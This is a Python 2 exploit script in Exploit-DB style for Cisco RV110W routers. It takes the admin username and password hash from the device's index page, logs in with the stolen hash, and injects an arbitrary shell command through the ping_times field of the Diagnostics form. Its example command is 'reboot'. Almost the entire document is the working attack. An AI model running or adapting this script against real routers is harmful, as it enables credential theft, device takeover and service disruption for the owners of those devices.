
#####
## Cisco RV110W Password Disclosure and OS Command Execute.
### Tested on version: 1.1.0.9 (maybe useable on 1.2.0.9 and later.)

# Exploit Title: Cisco RV110W Password Disclosure and OS Command Execute
# Date: 2018-08
# Exploit Author: RySh
# Vendor Homepage: https://www.cisco.com/
# Version: 1.1.0.9
# Tested on: RV110W 1.1.0.9
# CVE : CVE-2014-0683, CVE-2015-6396

import os
import sys
import re
import urllib
import urllib2
import getopt
import json

import ssl

ssl._create_default_https_context = ssl._create_unverified_context

###
# Usage: ./{script_name} 192.168.1.1 443 "reboot"
###

if __name__ == "__main__":
    IP = argv[1]
    PORT = argv[2]
    CMD = argv[3]
    
    # Get session key, Just access index page.
    url = &#039;https://&#039; + IP + &#039;:&#039; + PORT + &#039;/&#039;
    req = urllib2.Request(url)
    result = urllib2.urlopen(req)
    res = result.read()
    
    # parse &#039;admin_pwd&#039;! -- Get credits
    admin_user = re.search(r&#039;.*(.*admin_name=\")(.*)\"&#039;, res).group().split("\"")[1]
    admin_pwd = re.search(r&#039;.*(.*admin_pwd=\")(.{32})&#039;, res).group()[-32:]
    print "Get Cred. Username = " + admin_user + ", PassHash = " + admin_pwd

    # Get session_id by POST
    req2 = urllib2.Request(url + "login.cgi")
    req2.add_header(&#039;Origin&#039;, url)
    req2.add_header(&#039;Upgrade-Insecure-Requests&#039;, 1)
    req2.add_header(&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded&#039;)
    req2.add_header(&#039;User-Agent&#039;,
                    &#039;Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)&#039;)
    req2.add_header(&#039;Accept&#039;, &#039;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#039;)
    req2.add_header(&#039;Referer&#039;, url)
    req2.add_header(&#039;Accept-Encoding&#039;, &#039;gzip, deflate&#039;)
    req2.add_header(&#039;Accept-Language&#039;, &#039;en-US,en;q=0.9&#039;)
    req2.add_header(&#039;Cookie&#039;, &#039;SessionID=&#039;)
    data = {"submit_button": "login",
            "submit_type": "",
            "gui_action": "",
            "wait_time": "0",
            "change_action": "",
            "enc": "1",
            "user": admin_user,
            "pwd": admin_pwd,
            "sel_lang": "EN"
            }
    r = urllib2.urlopen(req2, urllib.urlencode(data))
    resp = r.read()
    login_st = re.search(r&#039;.*login_st=\d;&#039;, resp).group().split("=")[1]
    session_id = re.search(r&#039;.*session_id.*\";&#039;, resp).group().split("\"")[1]

    # Execute your commands via diagnose command parameter, default command is `reboot`
    req3 = urllib2.Request(url + "apply.cgi;session_id=" + session_id)
    req3.add_header(&#039;Origin&#039;, url)
    req3.add_header(&#039;Upgrade-Insecure-Requests&#039;, 1)
    req3.add_header(&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded&#039;)
    req3.add_header(&#039;User-Agent&#039;,
                    &#039;Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)&#039;)
    req3.add_header(&#039;Accept&#039;, &#039;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#039;)
    req3.add_header(&#039;Referer&#039;, url)
    req3.add_header(&#039;Accept-Encoding&#039;, &#039;gzip, deflate&#039;)
    req3.add_header(&#039;Accept-Language&#039;, &#039;en-US,en;q=0.9&#039;)
    req3.add_header(&#039;Cookie&#039;, &#039;SessionID=&#039;)
    data_cmd = {"submit_button": "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "gui_action": "",
            "traceroute_ip": "",
            "commit": "1",
            "ping_times": "3 |" + CMD + "|",
            "ping_size": "64",
            "wait_time": "4",
            "ping_ip": "127.0.0.1",
            "lookup_name": ""
            }
    r = urllib2.urlopen(req3, urllib.urlencode(data_cmd))

